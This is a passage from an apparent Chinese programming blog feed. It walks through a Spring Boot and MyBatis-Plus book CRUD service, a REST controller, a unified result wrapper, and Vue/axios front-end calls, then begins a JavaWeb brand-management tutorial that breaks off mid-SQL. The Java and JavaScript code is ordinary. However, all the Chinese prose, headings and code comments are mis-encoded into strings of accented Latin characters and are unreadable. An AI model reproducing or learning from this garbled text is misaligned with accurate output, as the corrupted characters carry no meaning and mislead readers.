class="hljs-keyword">import</span> java.util.List;<span class="hljs-comment">// æ³¨å†Œä¸ºæ•°æ®é€»è¾‘å±‚çš„bean</span><span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">BookService</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> BookDao bookDao;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(Book book)</span> </span>&#123;        <span class="hljs-keyword">return</span> bookDao.insert(book) &gt; <span class="hljs-number">0</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(Book book)</span> </span>&#123;        <span class="hljs-keyword">return</span> bookDao.updateById(book) &gt; <span class="hljs-number">0</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span> </span>&#123;        <span class="hljs-keyword">return</span> bookDao.deleteById(id) &gt; <span class="hljs-number">0</span>;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span> </span>&#123;        <span class="hljs-keyword">return</span> bookDao.selectList(<span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Book <span class="hljs-title">getById</span><span class="hljs-params">(Integer id)</span> </span>&#123;        <span class="hljs-keyword">return</span> bookDao.selectById(id);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span> </span>&#123;        IPage&lt;Book&gt; page = <span class="hljs-keyword">new</span> Page&lt;&gt;(currentPage, pageSize);        <span class="hljs-keyword">return</span> bookDao.selectPage(page, <span class="hljs-keyword">null</span>);    &#125;&#125;</code></pre><p>ä½¿ç”¨mybatisplusçš„è‡ªå¸¦æ¥å£å¿«é€Ÿå¼€å‘</p><p>ä¸šåŠ¡å±‚æ¥å£å¿«é€Ÿå¼€å‘</p><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IBookService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">IService</span>&lt;<span class="hljs-title">Book</span>&gt; </span>&#123;    <span class="hljs-comment">//æ·»åŠ éé€šç”¨æ“ä½œAPIæ¥å£</span>&#125;</code></pre><p>â€‹        ä¸šåŠ¡å±‚æ¥å£å®ç°ç±»å¿«é€Ÿå¼€å‘ï¼Œå…³æ³¨ç»§æ‰¿çš„ç±»éœ€è¦ä¼ å…¥ä¸¤ä¸ªæ³›å‹ï¼Œä¸€ä¸ªæ˜¯æ•°æ®å±‚æ¥å£ï¼Œå¦ä¸€ä¸ªæ˜¯å®ä½“ç±»ã€‚</p><pre><code class="hljs JAVA"><span class="hljs-meta">@Service</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ServiceImpl</span>&lt;<span class="hljs-title">BookDao</span>, <span class="hljs-title">Book</span>&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title">IBookService</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> BookDao bookDao;<span class="hljs-comment">//æ·»åŠ éé€šç”¨æ“ä½œAPI</span>&#125;</code></pre><p>â€‹        å¦‚æœæ„Ÿè§‰MyBatisPlusæä¾›çš„åŠŸèƒ½ä¸è¶³ä»¥æ”¯æ’‘ä½ çš„ä½¿ç”¨éœ€è¦ï¼ˆå…¶å®æ˜¯ä¸€å®šä¸èƒ½æ”¯æ’‘çš„ï¼Œå› ä¸ºéœ€æ±‚ä¸å¯èƒ½æ˜¯é€šç”¨çš„ï¼‰ï¼Œåœ¨åŸå§‹æ¥å£åŸºç¡€ä¸Šæ¥ç€å®šä¹‰æ–°çš„APIæ¥å£å°±è¡Œäº†ï¼Œæ­¤å¤„ä¸å†è¯´å¤ªå¤šäº†ï¼Œå°±æ˜¯è‡ªå®šä¹‰è‡ªå·±çš„æ“ä½œäº†ï¼Œä½†æ˜¯ä¸è¦å’Œå·²æœ‰çš„APIæ¥å£åå†²çªå³å¯ã€‚</p><p><strong>æ€»ç»“</strong></p><ol><li>ä½¿ç”¨é€šç”¨æ¥å£ï¼ˆISerivce<T>ï¼‰å¿«é€Ÿå¼€å‘Service</T></li><li>ä½¿ç”¨é€šç”¨å®ç°ç±»ï¼ˆServiceImpl&lt;M,T&gt;ï¼‰å¿«é€Ÿå¼€å‘ServiceImpl</li><li>å¯ä»¥åœ¨é€šç”¨æ¥å£åŸºç¡€ä¸ŠåšåŠŸèƒ½é‡è½½æˆ–åŠŸèƒ½è¿½åŠ </li><li>æ³¨æ„é‡è½½æ—¶ä¸è¦è¦†ç›–åŸå§‹æ“ä½œï¼Œé¿å…åŸå§‹æä¾›çš„åŠŸèƒ½ä¸¢å¤±</li></ol><h3 id="è¡¨ç°å±‚å¼€å‘"><a href="#è¡¨ç°å±‚å¼€å‘" class="headerlink" title="è¡¨ç°å±‚å¼€å‘"></a>è¡¨ç°å±‚å¼€å‘</h3><p>è¡¨ç°å±‚æ¥å£å¦‚ä¸‹ï¼š</p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;<span class="hljs-keyword">import</span> com.sunzy.domain.Book;<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-comment">//ä½¿ç”¨restfulæ¥å£çº¦æŸ</span><span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookController2</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> IBookService service;    <span class="hljs-meta">@GetMapping</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">return</span> service.list();    &#125;    <span class="hljs-meta">@PostMapping</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;        System.out.println(book);        <span class="hljs-keyword">return</span> service.save(book);    &#125;    <span class="hljs-meta">@PutMapping</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();        wrapper.eq(Book::getId, book.getId());        <span class="hljs-keyword">return</span> service.update(book,wrapper);    &#125;    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;        <span class="hljs-keyword">return</span> service.removeById(id);    &#125;    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> Book <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id )</span></span>&#123;        <span class="hljs-keyword">return</span> service.getById(id);    &#125;    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> pageSize)</span></span>&#123;        Page&lt;Book&gt; page = <span class="hljs-keyword">new</span> Page&lt;&gt;(currentPage, pageSize);        <span class="hljs-keyword">return</span> service.page(page);    &#125;&#125;</code></pre><p>ä½¿ç”¨postmanæµ‹è¯•å„ä¸ªæ¥å£æ˜¯å¦å¯ä»¥æ­£å¸¸å·¥ä½œ</p><p>getByIdåŠŸèƒ½</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231257883.png" alt="image-20220418231257883"></p><p>åˆ†é¡µåŠŸèƒ½</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231337888.png" alt="image-20220418231337888"></p><p>save()åŠŸèƒ½</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418231557326.png" alt="image-20220418231557326"></p><p>åˆ é™¤åŠŸèƒ½delete()</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220418232140801.png" alt="image-20220418232140801"></p><p>==æ¶ˆæ¯ä¸€è‡´æ€§å¤„ç†== </p><pre><code class="hljs java"><span class="hljs-meta">@Data</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span> </span>&#123;    <span class="hljs-keyword">private</span> Boolean flag;   <span class="hljs-comment">//è¡¨ç¤ºæœ¬æ¬¡è¯·æ±‚æ˜¯å¦æˆåŠŸ</span>    <span class="hljs-keyword">private</span> Object data;    <span class="hljs-comment">//æœ¬æ¬¡è¯·æ±‚è¿”å›çš„æ•°æ®</span>&#125;</code></pre><p>ä½¿ç”¨æ¶ˆæ¯ä¸€è‡´å¤„ç†åè·å–çš„æ•°æ®æ ¼å¼</p><pre><code class="hljs java">&#123;Â Â Â Â <span class="hljs-string">&quot;flag&quot;</span>:Â <span class="hljs-keyword">true</span>,Â Â Â Â <span class="hljs-string">&quot;data&quot;</span>:&#123;Â Â Â Â Â Â Â Â <span class="hljs-string">&quot;id&quot;</span>:Â <span class="hljs-number">1</span>,Â Â Â Â Â Â Â Â <span class="hljs-string">&quot;type&quot;</span>:Â <span class="hljs-string">&quot;è®¡ç®—æœºç†è®º&quot;</span>,Â Â Â Â Â Â Â Â <span class="hljs-string">&quot;name&quot;</span>:Â <span class="hljs-string">&quot;Springå®æˆ˜Â ç¬¬5ç‰ˆ&quot;</span>,Â Â Â Â Â Â Â Â <span class="hljs-string">&quot;description&quot;</span>:Â <span class="hljs-string">&quot;Springå…¥é—¨ç»å…¸æ•™ç¨‹&quot;</span>Â Â Â Â &#125;&#125;</code></pre><p>ä¿®æ”¹è¡¨ç°å±‚ä»£ç </p><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.controller;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;<span class="hljs-keyword">import</span> com.sunzy.controller.utils.R;<span class="hljs-keyword">import</span> com.sunzy.domain.Book;<span class="hljs-keyword">import</span> com.sunzy.service.IBookService;<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;<span class="hljs-keyword">import</span> java.util.List;<span class="hljs-meta">@RestController</span><span class="hljs-meta">@RequestMapping(&quot;/books&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookController</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> IBookService service;    <span class="hljs-meta">@GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">getAll</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> currentPage, <span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> pageSize, Book book)</span></span>&#123;        IPage&lt;Book&gt; bookIPage = service.getAll(currentPage, pageSize, book);        <span class="hljs-keyword">if</span>(currentPage &gt; bookIPage.getPages()) &#123;            bookIPage = service.getAll((<span class="hljs-keyword">int</span>) bookIPage.getPages(), pageSize, book);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(<span class="hljs-keyword">null</span> != bookIPage, bookIPage);    &#125;    <span class="hljs-meta">@PostMapping</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">save</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.save(book));    &#125;    <span class="hljs-meta">@PutMapping</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">update</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Book book)</span></span>&#123;        LambdaQueryWrapper&lt;Book&gt; wrapper = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;&gt;();        wrapper.eq(Book::getId, book.getId());        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.update(book,wrapper));    &#125;    <span class="hljs-meta">@DeleteMapping(&quot;&#123;id&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">delete</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id)</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(service.removeById(id));    &#125;    <span class="hljs-meta">@GetMapping(&quot;&#123;id&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> R <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> <span class="hljs-keyword">int</span> id )</span></span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> R(<span class="hljs-keyword">true</span>, service.getById(id));    &#125;<span class="hljs-comment">//    @GetMapping(&quot;&#123;currentPage&#125;/&#123;pageSize&#125;&quot;)</span><span class="hljs-comment">//    public R getPage(@PathVariable int currentPage, @PathVariable int pageSize)&#123;</span><span class="hljs-comment">//        Page&lt;Book&gt; ipage = new Page&lt;&gt;(currentPage, pageSize);</span><span class="hljs-comment">//        Page&lt;Book&gt; page = service.page(ipage);</span><span class="hljs-comment">//</span><span class="hljs-comment">//        if(currentPage &gt; page.getCurrent())&#123;</span><span class="hljs-comment">//            ipage.setCurrent(page.getPages());</span><span class="hljs-comment">//            page = service.page(ipage);</span><span class="hljs-comment">//        &#125;</span><span class="hljs-comment">//        return new R(true, page);</span><span class="hljs-comment">//    &#125;</span>&#125;</code></pre><h3 id="å‰ç«¯é¡µé¢ä»£ç "><a href="#å‰ç«¯é¡µé¢ä»£ç " class="headerlink" title="å‰ç«¯é¡µé¢ä»£ç "></a>å‰ç«¯é¡µé¢ä»£ç </h3><h4 id="åˆ†é¡µæŸ¥è¯¢æ‰€æœ‰æ•°æ®å’Œæ¡ä»¶æŸ¥è¯¢"><a href="#åˆ†é¡µæŸ¥è¯¢æ‰€æœ‰æ•°æ®å’Œæ¡ä»¶æŸ¥è¯¢" class="headerlink" title="åˆ†é¡µæŸ¥è¯¢æ‰€æœ‰æ•°æ®å’Œæ¡ä»¶æŸ¥è¯¢"></a>åˆ†é¡µæŸ¥è¯¢æ‰€æœ‰æ•°æ®å’Œæ¡ä»¶æŸ¥è¯¢</h4><p>é¡µé¢æ•°æ®æ¨¡å‹å®šä¹‰</p><pre><code class="hljs java">data:&#123;dataList: [],              <span class="hljs-comment">//å½“å‰é¡µè¦å±•ç¤ºçš„åˆ—è¡¨æ•°æ®</span>pagination: &#123;              <span class="hljs-comment">//åˆ†é¡µç›¸å…³æ¨¡å‹æ•°æ®</span>                currentPage: <span class="hljs-number">1</span>,<span class="hljs-comment">//å½“å‰é¡µç </span>                pageSize:<span class="hljs-number">10</span>,   <span class="hljs-comment">//æ¯é¡µæ˜¾ç¤ºçš„è®°å½•æ•°</span>                total:<span class="hljs-number">0</span>,       <span class="hljs-comment">//æ€»è®°å½•æ•°</span>                name:<span class="hljs-string">&#x27;&#x27;</span>,                type:<span class="hljs-string">&#x27;&#x27;</span>,                description:<span class="hljs-string">&#x27;&#x27;</span>    &#125;&#125;</code></pre><p>å¼‚æ­¥è¯·æ±‚ä»£ç </p><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-title">getAll</span>(<span class="hljs-params"></span>)</span> &#123;    param = <span class="hljs-string">&quot;?name=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.name;    param = param + <span class="hljs-string">&quot;&amp;type=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.type;    param = param + <span class="hljs-string">&quot;&amp;description=&quot;</span> + <span class="hljs-built_in">this</span>.pagination.description;    <span class="hljs-comment">// console.log(param);</span>    axios.get(<span class="hljs-string">&quot;/books/&quot;</span>+<span class="hljs-built_in">this</span>.pagination.currentPage + <span class="hljs-string">&quot;/&quot;</span> + <span class="hljs-built_in">this</span>.pagination.pageSize + param).then(<span class="hljs-function">(<span class="hljs-params">res</span>)=&gt;</span>&#123;        <span class="hljs-built_in">this</span>.dataList = res.data.data.records;        <span class="hljs-built_in">this</span>.pagination.total = res.data.data.total;        <span class="hljs-built_in">this</span>.pagination.currentPage = res.data.data.current;        <span class="hljs-built_in">this</span>.pagination.pagesize = res.data.data.size;    &#125;);&#125;</code></pre><p>åœ¨é’©å­å‡½æ•°ä¸­æ‰§è¡Œè¯¥æ–¹æ³•</p><pre><code class="hljs java"><span class="hljs-comment">//é’©å­å‡½æ•°ï¼ŒVUEå¯¹è±¡åˆå§‹åŒ–å®Œæˆåè‡ªåŠ¨æ‰§è¡Œ</span>created() &#123;    <span class="hljs-keyword">this</span>.getAll();&#125;,</code></pre><h4 id="æ·»åŠ æ•°æ®"><a href="#æ·»åŠ æ•°æ®" class="headerlink" title="æ·»åŠ æ•°æ®"></a>æ·»åŠ æ•°æ®</h4><p>æ·»åŠ æ•°æ®çš„çª—å£å¼¹å‡ºæ§åˆ¶</p><p>æ•°æ®æ¨¡å‹</p><pre><code class="hljs js">dialogFormVisible: <span class="hljs-literal">false</span>,<span class="hljs-comment">//æ·»åŠ è¡¨å•æ˜¯å¦å¯è§</span>formData</code></pre><p>å¯¹è¯æ¡†æ§åˆ¶å‡½æ•°</p><pre><code class="hljs java"><span class="hljs-comment">//å¼¹å‡ºæ·»åŠ çª—å£</span>handleCreate() &#123;    <span class="hljs-keyword">this</span>.dialogFormVisible = <span class="hljs-keyword">true</span>;    <span class="hljs-keyword">this</span>.resetForm();&#125;,</code></pre><p>é‡ç½®è¡¨å•åŠŸèƒ½</p><pre><code class="hljs java"><span class="hljs-comment">//é‡ç½®è¡¨å•</span>resetForm() &#123;    <span class="hljs-keyword">this</span>.formData = &#123;&#125;;&#125;,</code></pre><p>æ·»åŠ åŠŸèƒ½</p><pre><code class="hljs java">handleAdd () &#123;    axios.post(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-keyword">this</span>.formData).then((res) =&gt; &#123;        <span class="hljs-keyword">if</span>(res.data.flag)&#123;            <span class="hljs-keyword">this</span>.dialogFormVisible = <span class="hljs-keyword">false</span>;            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;æ·»åŠ æˆåŠŸï¼&quot;</span>);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;æ·»åŠ å¤±è´¥ï¼&quot;</span>);        &#125;    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;        <span class="hljs-keyword">this</span>.getAll();    &#125;)&#125;</code></pre><h4 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h4><pre><code class="hljs java"><span class="hljs-comment">// åˆ é™¤</span>handleDelete(row) &#123;    axios.delete(<span class="hljs-string">&quot;/books/&quot;</span> + row.id).then((res)=&gt;&#123;        <span class="hljs-keyword">if</span>(res.data.flag)&#123;            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;åˆ é™¤æˆåŠŸï¼&quot;</span>);            <span class="hljs-keyword">this</span>.getAll();        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;åˆ é™¤å¤±è´¥ï¼&quot;</span>);        &#125;    &#125;)&#125;,</code></pre><h4 id="ä¿®æ”¹æ•°æ®"><a href="#ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¿®æ”¹æ•°æ®"></a>ä¿®æ”¹æ•°æ®</h4><pre><code class="hljs java"><span class="hljs-comment">//å¼¹å‡ºç¼–è¾‘çª—å£</span>handleUpdate(row) &#123;    <span class="hljs-keyword">this</span>.dialogFormVisible4Edit = <span class="hljs-keyword">true</span>;    <span class="hljs-keyword">this</span>.formData = row;&#125;,<span class="hljs-comment">//ä¿®æ”¹</span>handleEdit() &#123;    axios.put(<span class="hljs-string">&quot;/books&quot;</span>, <span class="hljs-keyword">this</span>.formData).then((res) =&gt; &#123;        <span class="hljs-keyword">if</span>(res.data.flag)&#123;            <span class="hljs-keyword">this</span>.dialogFormVisible4Edit = <span class="hljs-keyword">false</span>;            <span class="hljs-keyword">this</span>.$message.success(<span class="hljs-string">&quot;ä¿®æ”¹æˆåŠŸï¼&quot;</span>);        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">this</span>.$message.error(<span class="hljs-string">&quot;ä¿®æ”¹å¤±è´¥ï¼&quot;</span>);        &#125;    &#125;).<span class="hljs-keyword">finally</span>(() =&gt; &#123;        <span class="hljs-keyword">this</span>.getAll();    &#125;)&#125;,</code></pre>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>springboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>javaweb</title>
    <link href="/2022/03/30/javaweb/"/>
    <url>/2022/03/30/javaweb/</url>
    
    <content type="html"><![CDATA[<h1 id="JavawebåŸºç¡€é¡¹ç›®"><a href="#JavawebåŸºç¡€é¡¹ç›®" class="headerlink" title="JavawebåŸºç¡€é¡¹ç›®"></a>JavawebåŸºç¡€é¡¹ç›®</h1><p>å­¦å®Œ javaweb åšçš„å°é¡¹ç›®</p><h2 id="ç»¼åˆæ¡ˆä¾‹éœ€æ±‚ä¸å‡†å¤‡"><a href="#ç»¼åˆæ¡ˆä¾‹éœ€æ±‚ä¸å‡†å¤‡" class="headerlink" title="ç»¼åˆæ¡ˆä¾‹éœ€æ±‚ä¸å‡†å¤‡"></a>ç»¼åˆæ¡ˆä¾‹éœ€æ±‚ä¸å‡†å¤‡</h2><p><strong>ä»Šæ—¥ç›®æ ‡ï¼š</strong></p><blockquote><ul><li>èƒ½å¤Ÿå®ŒæˆæŸ¥è¯¢æ‰€æœ‰åŠŸèƒ½</li><li>èƒ½å¤Ÿå®Œæˆæ·»åŠ åŠŸèƒ½</li><li>èƒ½å¤Ÿç†è§£ BaseServlet æ€æƒ³</li><li>èƒ½å¤Ÿå®Œæˆæ‰¹é‡åˆ é™¤åŠŸèƒ½</li><li>èƒ½å¤Ÿå®Œæˆåˆ†é¡µæŸ¥è¯¢åŠŸèƒ½</li><li>èƒ½å¤Ÿå®Œæˆæ¡ä»¶æŸ¥è¯¢åŠŸèƒ½</li></ul></blockquote><h3 id="1ï¼ŒåŠŸèƒ½ä»‹ç»"><a href="#1ï¼ŒåŠŸèƒ½ä»‹ç»" class="headerlink" title="1ï¼ŒåŠŸèƒ½ä»‹ç»"></a>1ï¼ŒåŠŸèƒ½ä»‹ç»</h3><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825171411003.png" alt="image-20210825171411003"></p><p>ä»¥ä¸Šæ˜¯æˆ‘ä»¬åœ¨ç»¼åˆæ¡ˆä¾‹è¦å®ç°çš„åŠŸèƒ½ã€‚å¯¹æ•°æ®çš„é™¤äº†å¯¹æ•°æ®çš„å¢åˆ æ”¹æŸ¥åŠŸèƒ½å¤–ï¼Œè¿˜æœ‰ä¸€äº›å¤æ‚çš„åŠŸèƒ½ï¼Œå¦‚ <code>æ‰¹é‡åˆ é™¤</code>ã€<code>åˆ†é¡µæŸ¥è¯¢</code>ã€<code>æ¡ä»¶æŸ¥è¯¢</code> ç­‰åŠŸèƒ½</p><ul><li><code>æ‰¹é‡åˆ é™¤</code> åŠŸèƒ½ï¼šæ¯æ¡æ•°æ®å‰éƒ½æœ‰å¤é€‰æ¡†ï¼Œå½“æˆ‘é€‰ä¸­å¤šæ¡æ•°æ®å¹¶ç‚¹å‡» <code>æ‰¹é‡åˆ é™¤</code> æŒ‰é’®åï¼Œä¼šå‘é€è¯·æ±‚åˆ°åç«¯å¹¶åˆ é™¤æ•°æ®åº“ä¸­æŒ‡å®šçš„å¤šæ¡æ•°æ®ã€‚</li><li><code>åˆ†é¡µæŸ¥è¯¢</code> åŠŸèƒ½ï¼šå½“æ•°æ®åº“ä¸­æœ‰å¾ˆå¤šæ•°æ®æ—¶ï¼Œæˆ‘ä»¬ä¸å¯èƒ½å°†æ‰€æœ‰çš„æ•°æ®å±•ç¤ºåœ¨ä¸€é¡µé‡Œï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦åˆ†é¡µå±•ç¤ºæ•°æ®ã€‚</li><li><code>æ¡ä»¶æŸ¥è¯¢</code> åŠŸèƒ½ï¼šæ•°æ®åº“é‡å¤§çš„æ—¶å€™ï¼Œæˆ‘ä»¬å°±éœ€è¦ç²¾ç¡®çš„æŸ¥è¯¢ä¸€äº›æƒ³çœ‹åˆ°çš„æ•°æ®ï¼Œè¿™ä¸ªæ—¶å€™å°±éœ€è¦é€šè¿‡æ¡ä»¶æŸ¥è¯¢ã€‚</li></ul><p>è¿™é‡Œçš„ <code>ä¿®æ”¹å“ç‰Œ</code> å’Œ <code>åˆ é™¤å“ç‰Œ</code> åŠŸèƒ½åœ¨è¯¾ç¨‹ä¸Šä¸åšè®²è§£ï¼Œç•™ä½œåŒå­¦æ¥ä¸‹çš„ç»ƒä¹ ã€‚</p><h3 id="2ï¼Œç¯å¢ƒå‡†å¤‡"><a href="#2ï¼Œç¯å¢ƒå‡†å¤‡" class="headerlink" title="2ï¼Œç¯å¢ƒå‡†å¤‡"></a>2ï¼Œç¯å¢ƒå‡†å¤‡</h3><p>ç¯å¢ƒå‡†å¤‡æˆ‘ä»¬ä¸»è¦å®Œæˆä»¥ä¸‹ä¸¤ä»¶äº‹å³å¯</p><ul><li>å°†èµ„æ–™çš„ brand-case æ¨¡å—å¯¼å…¥åˆ° ideaä¸­</li><li>æ‰§è¡Œèµ„æ–™ä¸­æä¾›çš„ tb_brand.sqlè„šæœ¬</li></ul><p>åœ¨æ²¡æœ‰èµ„æ–™çš„æƒ…å†µä¸‹åœ¨ideaä¸­åˆ›å»º<code>maven</code>çš„webé¡¹ç›®å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•</p><p><code>file</code> -&gt; <code>new</code> -&gt; <code>module</code>-&gt;<code>Maven</code>-&gt;<code>Create from archetype</code>-&gt;<code>maven archetype</code>-&gt;<code>next</code></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330133227350.png" alt="image-20220330133227350"></p><h4 id="2-1-å·¥ç¨‹å‡†å¤‡"><a href="#2-1-å·¥ç¨‹å‡†å¤‡" class="headerlink" title="2.1  å·¥ç¨‹å‡†å¤‡"></a>2.1  å·¥ç¨‹å‡†å¤‡</h4><p>å°† <code>04-èµ„æ–™\01-åˆå§‹å·¥ç¨‹</code> ä¸­çš„ <code>brand-case</code> å·¥ç¨‹å¯¼å…¥åˆ°æˆ‘ä»¬è‡ªå·±çš„ idea ä¸­ã€‚å·¥ç¨‹ç»“æ„å¦‚ä¸‹ï¼š</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210825195522904.png" alt="image-20210825195522904" style="zoom:80%;"><h4 id="2-2-åˆ›å»ºè¡¨"><a href="#2-2-åˆ›å»ºè¡¨" class="headerlink" title="2.2  åˆ›å»ºè¡¨"></a>2.2  åˆ›å»ºè¡¨</h4><p>ä¸‹é¢æ˜¯åˆ›å»ºè¡¨çš„è¯­å¥</p><pre><code class="hljs sql"><span class="hljs-comment">-- åˆ é™¤tb_brandè¡¨</span><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span 